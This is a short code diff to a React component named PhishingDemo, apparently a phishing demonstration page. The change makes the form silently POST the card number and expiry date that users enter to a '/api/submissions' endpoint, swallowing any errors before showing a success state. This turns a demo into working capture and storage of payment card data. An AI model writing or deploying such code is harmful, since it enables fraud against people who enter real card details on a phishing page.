@@ -62,8 +62,17 @@ export default function PhishingDemo() {
     }
   }
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    try {
+      await fetch('/api/submissions', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cardNumber, expiry }),
+      })
+    } catch {
+      // silently continue even if save fails
+    }
     setSubmitted(true)
   }
 
